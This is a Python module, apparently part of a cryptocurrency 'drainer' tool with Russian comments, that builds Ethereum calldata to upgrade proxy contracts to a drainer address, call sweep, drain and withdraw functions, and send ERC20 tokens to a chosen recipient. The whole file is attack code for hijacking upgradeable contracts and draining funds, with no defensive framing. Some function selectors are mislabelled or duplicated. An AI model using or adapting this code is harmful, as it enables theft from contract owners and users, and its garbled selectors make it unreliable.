# core/drain_payloads.py

from config.settings import DRAINER_ADDRESSES

# Сигнатуры распространённых функций
UPGRADE_TO_SIG = "0x3659cfe6"
UPGRADE_AND_CALL_SIG = "0xf851a440"
TRANSFER_SIG = "a9059cbb"

SWEEP_SIGS = {
    "sweepETH()": "0x1cff79cd",
    "drain()": "0x3ccfd60b",
    "claim()": "0x4e71d92d",
    "withdraw()": "0x3ccfd60b",
    "execute()": "0x1cff79cd",
}


def build_upgrade_to(drainer_address: str) -> str:
    """
    upgradeTo(address)
    """
    return UPGRADE_TO_SIG + drainer_address[2:].rjust(64, "0")


def build_upgrade_and_call(drainer_address: str, inner_data: str) -> str:
    """
    upgradeToAndCall(address,bytes)
    """
    addr = drainer_address[2:].rjust(64, "0")
    data_clean = inner_data[2:]
    data_len = hex(len(data_clean) // 2)[2:].rjust(64, "0")
    return UPGRADE_AND_CALL_SIG + addr + "0000000000000000000000000000000000000000000000000000000000000040" + data_len + data_clean


def build_sweep_payload(method: str = "sweepETH()") -> str:
    """
    Генерация calldata для sweep-функции
    """
    return SWEEP_SIGS.get(method, SWEEP_SIGS["sweepETH()"])


def build_transfer_payload(to_address: str, amount_wei: int) -> str:
    """
    ERC20 transfer(address,uint256)
    """
    address_padded = to_address[2:].rjust(64, "0")
    amount_hex = hex(amount_wei)[2:].rjust(64, "0")
    return "0x" + TRANSFER_SIG + address_padded + amount_hex
